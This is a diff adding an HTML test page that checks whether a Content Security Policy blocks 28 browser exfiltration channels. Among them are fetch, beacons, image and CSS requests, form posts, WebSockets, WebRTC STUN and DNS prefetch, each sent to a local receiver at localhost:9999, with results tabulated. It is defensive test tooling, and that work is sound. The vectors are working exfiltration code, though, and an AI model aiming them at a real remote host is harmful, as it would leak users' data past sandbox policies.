@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>CSP Exfiltration Test Harness</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: system-ui, sans-serif; padding: 24px; background: #fafafa; color: #111; }
+    h1 { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+    .subtitle { font-size: 14px; color: #666; margin-bottom: 24px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13px; }
+    th, td { text-align: left; padding: 6px 10px; border-bottom: 1px solid #e5e5e5; }
+    th { font-weight: 600; background: #f5f5f5; position: sticky; top: 0; }
+    .blocked { color: #16a34a; font-weight: 500; }
+    .executed { color: #dc2626; font-weight: 500; }
+    .error { color: #d97706; }
+    .pending { color: #9ca3af; }
+    #status { margin-bottom: 16px; font-size: 13px; }
+    #export-btn { margin-top: 16px; padding: 8px 16px; cursor: pointer;
+      background: #111; color: #fff; border: none; font-size: 13px; }
+    #export-btn:hover { background: #333; }
+  </style>
+</head>
+<body>
+  <h1>CSP Exfiltration Test Harness</h1>
+  <p class="subtitle">
+    Testing exfiltration vectors against the current page's CSP policy.
+    Receiver expected at <code>http://localhost:9999</code>.
+  </p>
+  <div id="status">Running tests...</div>
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Vector</th>
+        <th>Category</th>
+        <th>Result</th>
+        <th>Detail</th>
+      </tr>
+    </thead>
+    <tbody id="results"></tbody>
+  </table>
+  <button id="export-btn" style="display:none">Export JSON</button>
+
+<script>
+(function() {
+  "use strict";
+
+  var RECEIVER = "http://localhost:9999";
+  var results = [];
+  var tbody = document.getElementById("results");
+  var statusEl = document.getElementById("status");
+  var exportBtn = document.getElementById("export-btn");
+
+  window.__testResults = results;
+  window.__testsDone = false;
+
+  function createCell(text, className) {
+    var td = document.createElement("td");
+    td.textContent = text;
+    if (className) td.className = className;
+    return td;
+  }
+
+  function addResult(id, name, category, result, detail) {
+    var entry = { id: id, name: name, category: category, result: result, detail: detail || "" };
+    results.push(entry);
+    var tr = document.createElement("tr");
+    var cls = result === "blocked" ? "blocked" :
+              result === "executed" ? "executed" :
+              result === "error" ? "error" : "pending";
+    tr.appendChild(createCell(String(id)));
+    tr.appendChild(createCell(name));
+    tr.appendChild(createCell(category));
+    tr.appendChild(createCell(result, cls));
+    tr.appendChild(createCell(detail || ""));
+    tbody.appendChild(tr);
+  }
+
+  function runTest(id, name, category, fn) {
+    return Promise.resolve().then(function() {
+      return fn();
+    }).then(function(result) {
+      addResult(id, name, category, result || "executed", "");
+    }).catch(function(e) {
+      var msg = e instanceof Error ? e.message : String(e);
+      var isCspBlock = msg.indexOf("Content Security Policy") !== -1 ||
+        msg.indexOf("violates the following") !== -1 ||
+        msg.indexOf("Refused to") !== -1 ||
+        (e instanceof DOMException && e.name === "SecurityError") ||
+        (e instanceof DOMException && e.name === "NetworkError");
+      addResult(id, name, category, isCspBlock ? "blocked" : "error", msg.slice(0, 120));
+    });
+  }
+
+  function runAll() {
+    // CSP-blockable vectors
+    return runTest(1, "fetch()", "CSP-blockable", function() {
+      return fetch(RECEIVER + "/exfil?v=fetch").then(function(res) {
+        return res.ok ? "executed" : "error";
+      });
+    })
+    .then(function() {
+      return runTest(2, "XMLHttpRequest", "CSP-blockable", function() {
+        return new Promise(function(resolve, reject) {
+          var xhr = new XMLHttpRequest();
+          xhr.open("GET", RECEIVER + "/exfil?v=xhr");
+          xhr.onload = function() { resolve("executed"); };
+          xhr.onerror = function() { reject(new Error("Refused to connect (XHR)")); };
+          xhr.send();
+          setTimeout(function() { resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(3, "WebSocket", "CSP-blockable", function() {
+        return new Promise(function(resolve, reject) {
+          try {
+            var ws = new WebSocket("ws://localhost:9999/ws");
+            ws.onopen = function() { ws.close(); resolve("executed"); };
+            ws.onerror = function() { reject(new Error("Refused to connect (WebSocket)")); };
+            setTimeout(function() { resolve("timeout"); }, 3000);
+          } catch (e) { reject(e); }
+        });
+      });
+    })
+    .then(function() {
+      return runTest(4, "navigator.sendBeacon()", "CSP-blockable", function() {
+        var sent = navigator.sendBeacon(RECEIVER + "/exfil?v=beacon", "data");
+        return sent ? "executed" : "blocked";
+      });
+    })
+    .then(function() {
+      return runTest(5, "Image pixel beacon", "CSP-blockable", function() {
+        return new Promise(function(resolve, reject) {
+          var img = new Image();
+          img.onload = function() { resolve("executed"); };
+          img.onerror = function() { reject(new Error("Refused to load image")); };
+          img.src = RECEIVER + "/pixel.gif?v=img";
+          setTimeout(function() { resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(6, "CSS background-image", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var div = document.createElement("div");
+          div.style.cssText = "width:1px;height:1px;background-image:url(" + RECEIVER + "/bg.gif?v=css)";
+          document.body.appendChild(div);
+          setTimeout(function() {
+            document.body.removeChild(div);
+            resolve("unknown");
+          }, 2000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(7, "@font-face src", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var style = document.createElement("style");
+          style.textContent = "@font-face { font-family: 'test'; src: url(" + RECEIVER + "/font.woff?v=font); } .font-test { font-family: 'test'; }";
+          document.head.appendChild(style);
+          var span = document.createElement("span");
+          span.className = "font-test";
+          span.textContent = "test";
+          document.body.appendChild(span);
+          setTimeout(function() {
+            document.body.removeChild(span);
+            document.head.removeChild(style);
+            resolve("unknown");
+          }, 2000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(8, "form.submit()", "CSP-blockable", function() {
+        return new Promise(function(resolve, reject) {
+          try {
+            var form = document.createElement("form");
+            form.method = "POST";
+            form.action = RECEIVER + "/exfil?v=form";
+            form.target = "_blank";
+            var input = document.createElement("input");
+            input.name = "data";
+            input.value = "exfiltrated";
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+            setTimeout(function() {
+              document.body.removeChild(form);
+              resolve("executed");
+            }, 2000);
+          } catch (e) { reject(e); }
+        });
+      });
+    })
+    .then(function() {
+      return runTest(9, "EventSource (SSE)", "CSP-blockable", function() {
+        return new Promise(function(resolve, reject) {
+          try {
+            var es = new EventSource(RECEIVER + "/events?v=sse");
+            es.onopen = function() { es.close(); resolve("executed"); };
+            es.onerror = function() { es.close(); reject(new Error("Refused to connect (EventSource)")); };
+            setTimeout(function() { es.close(); resolve("timeout"); }, 3000);
+          } catch (e) { reject(e); }
+        });
+      });
+    })
+    .then(function() {
+      return runTest(10, "<object> load", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var obj = document.createElement("object");
+          obj.data = RECEIVER + "/obj.swf?v=object";
+          obj.onload = function() { resolve("executed"); };
+          obj.onerror = function() { resolve("blocked"); };
+          document.body.appendChild(obj);
+          setTimeout(function() { document.body.removeChild(obj); resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(11, "<link> stylesheet", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var link = document.createElement("link");
+          link.rel = "stylesheet";
+          link.href = RECEIVER + "/style.css?v=link";
+          link.onload = function() { resolve("executed"); };
+          link.onerror = function() { resolve("blocked"); };
+          document.head.appendChild(link);
+          setTimeout(function() { document.head.removeChild(link); resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(12, "<script src>", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var script = document.createElement("script");
+          script.src = RECEIVER + "/script.js?v=script";
+          script.onload = function() { resolve("executed"); };
+          script.onerror = function() { resolve("blocked"); };
+          document.head.appendChild(script);
+          setTimeout(function() { document.head.removeChild(script); resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(13, "<audio> src", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var audio = document.createElement("audio");
+          audio.src = RECEIVER + "/audio.mp3?v=audio";
+          audio.onloadeddata = function() { resolve("executed"); };
+          audio.onerror = function() { resolve("blocked"); };
+          document.body.appendChild(audio);
+          setTimeout(function() { document.body.removeChild(audio); resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(14, "<iframe> src", "CSP-blockable", function() {
+        return new Promise(function(resolve) {
+          var iframe = document.createElement("iframe");
+          iframe.src = RECEIVER + "/frame.html?v=iframe";
+          iframe.style.display = "none";
+          iframe.onload = function() { resolve("executed"); };
+          iframe.onerror = function() { resolve("blocked"); };
+          document.body.appendChild(iframe);
+          setTimeout(function() { document.body.removeChild(iframe); resolve("timeout"); }, 3000);
+        });
+      });
+    })
+    // Separately mitigated vectors
+    .then(function() {
+      return runTest(15, "WebRTC ICE (STUN)", "Separate mitigation", function() {
+        return new Promise(function(resolve, reject) {
+          if (typeof RTCPeerConnection === "undefined") {
+            resolve("blocked");
+            return;
+          }
+          try {
+            var pc = new RTCPeerConnection({
+              iceServers: [{ urls: "stun:localhost:9999" }],
+            });
+            pc.createDataChannel("exfil");
+            pc.createOffer().then(function(offer) {
+              pc.setLocalDescription(offer);
+              pc.onicecandidate = function(e) {
+                if (e.candidate) {
+                  resolve("executed");
+                  pc.close();
+                }
+              };
+              setTimeout(function() { pc.close(); resolve("timeout"); }, 5000);
+            });
+          } catch (e) { reject(e); }
+        });
+      });
+    })
+    .then(function() {
+      return runTest(16, "WebRTC data channel", "Separate mitigation", function() {
+        if (typeof RTCPeerConnection === "undefined") return "blocked";
+        return "available";
+      });
+    })
+    .then(function() {
+      return runTest(17, "DNS prefetch <link>", "Separate mitigation", function() {
+        return new Promise(function(resolve) {
+          var link = document.createElement("link");
+          link.rel = "dns-prefetch";
+          link.href = "//exfil-test.localhost";
+          document.head.appendChild(link);
+          setTimeout(function() {
+            document.head.removeChild(link);
+            resolve("unknown");
+          }, 2000);
+        });
+      });
+    })
+    .then(function() {
+      return runTest(18, "Service Worker", "Separate mitigation", function() {
+        if (!("serviceWorker" in navigator)) return "unavailable";
+        return navigator.serviceWorker.register("/sw.js").then(function() {
+          return "executed";
+        }).catch(function() {
+          return "blocked";
+        });
+      });
+    })
+    .then(function() {
+      return runTest(19, "SharedWorker", "Separate mitigation", function() {
+        if (typeof SharedWorker === "undefined") return "unavailable";
+        try {
+          var blob = new Blob(["onconnect=function(){}"], { type: "text/javascript" });
+          new SharedWorker(URL.createObjectURL(blob));
+          return "executed";
+        } catch (e) {
+          return "blocked";
+        }
+      });
+    })
+    .then(function() {
+      return runTest(20, "window.open()", "Separate mitigation", function() {
+        try {
+          var w = window.open(RECEIVER + "/popup?v=open", "_blank");
+          if (w) {
+            setTimeout(function() { w.close(); }, 1000);
+            return "executed";
+          }
+          return "blocked";
+        } catch (e) {
+          return "blocked";
+        }
+      });
+    })
+    // Side-channel vectors
+    .then(function() {
+      return runTest(21, "performance.now() precision", "Side-channel", function() {
+        var t1 = performance.now();
+        var t2 = performance.now();
+        var precision = t2 - t1;
+        return (precision < 0.005 ? "high-precision" : "reduced-precision") +
+          " (delta=" + precision.toFixed(6) + "ms)";
+      });
+    })
+    .then(function() {
+      return runTest(22, "SharedArrayBuffer", "Side-channel", function() {
+        return typeof SharedArrayBuffer !== "undefined" ? "available" : "unavailable";
+      });
+    })
+    .then(function() {
+      return runTest(23, "BroadcastChannel", "Side-channel", function() {
+        if (typeof BroadcastChannel === "undefined") return "unavailable";
+        try {
+          var bc = new BroadcastChannel("exfil-test");
+          bc.postMessage("test");
+          bc.close();
+          return "available (same-origin only)";
+        } catch (e) { return "blocked"; }
+      });
+    })
+    // API availability
+    .then(function() {
+      return runTest(24, "Clipboard API", "User-gesture", function() {
+        return typeof navigator.clipboard !== "undefined" ? "available" : "unavailable";
+      });
+    })
+    .then(function() {
+      return runTest(25, "Web Share API", "User-gesture", function() {
+        return typeof navigator.share === "function" ? "available" : "unavailable";
+      });
+    })
+    .then(function() {
+      return runTest(26, "WebTransport", "CSP-blockable", function() {
+        if (typeof WebTransport === "undefined") return "unavailable";
+        return new Promise(function(resolve) {
+          try {
+            var t = new WebTransport("https://localhost:9999");
+            t.ready.then(function() { t.close(); resolve("executed"); })
+              .catch(function() { resolve("blocked"); });
+          } catch (e) { resolve("blocked"); }
+        });
+      });
+    })
+    .then(function() {
+      return runTest(27, "Geolocation API", "Permissions", function() {
+        return "geolocation" in navigator ? "available" : "unavailable";
+      });
+    })
+    .then(function() {
+      return runTest(28, "Notification API", "Permissions", function() {
+        return typeof Notification !== "undefined" ? "available" : "unavailable";
+      });
+    })
+    .then(function() {
+      // Collect CSP violations
+      var violations = window.__cspViolations || [];
+      addResult(99, "CSP violations captured", "Meta",
+        violations.length > 0 ? "captured" : "none",
+        violations.length + " violation(s)");
+
+      window.__testsDone = true;
+      var blocked = results.filter(function(r) { return r.result === "blocked"; }).length;
+      var executed = results.filter(function(r) { return r.result === "executed"; }).length;
+      statusEl.textContent = "Done. " + results.length + " tests completed. " +
+        blocked + " blocked, " + executed + " executed.";
+      exportBtn.style.display = "inline-block";
+    });
+  }
+
+  // Capture CSP violations
+  window.__cspViolations = [];
+  document.addEventListener("securitypolicyviolation", function(e) {
+    window.__cspViolations.push({
+      directive: e.violatedDirective,
+      blockedURI: e.blockedURI,
+      timestamp: Date.now(),
+    });
+  });
+
+  runAll();
+})();
+</script>
+</body>
+</html>
